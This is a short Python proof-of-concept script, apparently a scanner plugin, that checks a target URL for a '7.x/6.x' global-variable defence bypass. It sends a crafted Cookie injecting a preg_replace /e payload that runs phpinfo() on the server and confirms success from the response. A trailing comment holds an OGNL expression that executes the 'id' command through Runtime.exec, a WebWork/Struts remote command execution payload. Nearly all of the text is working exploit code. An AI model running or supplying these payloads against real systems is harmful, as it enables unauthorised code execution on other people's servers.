import requests

class bypass:   
    def __init__(self):  
        with open('../opt/前端传url.txt','r') as file:
            self.url = file.readline()

    def pocs(self):
        replay = "/usr/local/etc/php"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0","Cookie": "GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
        response = requests.get(url=self.url,headers=headers)    #头部cve漏洞构造
        res = response.text
        if replay in res:
            a = "存在7.x/6.x 全局变量防御绕过漏洞"
            return a



bypass = bypass()
def bp():
    a = bypass.pocs()
    return a




# ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

#/usr/local/etc/php